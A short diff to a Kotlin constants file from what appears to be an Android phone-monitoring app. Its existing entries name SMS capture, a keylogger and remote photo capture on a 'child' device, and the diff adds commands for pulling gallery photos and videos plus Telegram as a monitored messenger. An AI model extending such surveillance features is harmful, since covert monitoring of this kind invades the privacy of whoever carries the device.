@@ -27,6 +27,8 @@ object Consts {
     const val SMS = "sms"
     const val KEY_LOGGER = "keyLogger"
     const val PHOTO = "photo"
+    const val PHOTOS = "photos"
+    const val VIDEOS = "videos"
     const val PARAMS = "params"
     const val TIMER = "timer"
     const val INTERVAL = "interval"
@@ -60,6 +62,9 @@ object Consts {
 
     const val CHILD_CAPTURE_PHOTO = "capturePhoto"
 
+    const val GET_GALLERY_PHOTO = "getPhotos"
+    const val GET_GALLERY_VIDEOS = "getVideos"
+
     const val COMMAND_TYPE = "commandType"
     const val PHONE_NUMBER = "phoneNumber"
     const val TYPE_CALL = "callType"
@@ -81,12 +86,14 @@ object Consts {
     const val FACEBOOK_MESSENGER_PACK_NAME = "com.facebook.orca"
     const val WHATSAPP_PACK_NAME = "com.whatsapp"
     const val INSTAGRAM_PACK_NAME = "com.instagram.android"
+    const val TELEGRAM_PACK_NAME = "org.telegram.messenger"
     const val TIKTOK_PACK_NAME = "com.zhiliaoapp.musically"
 
     const val TYPE_MESSENGER = 1
     const val TYPE_WHATSAPP = 2
     const val TYPE_INSTAGRAM = 3
     const val TYPE_TIKTOOK = 4
+    const val TYPE_TELEGRAM = 5
 
     val TEXT : Pattern = Pattern.compile("^[a-zA-ZñÑЁёА-я]+\$")
 
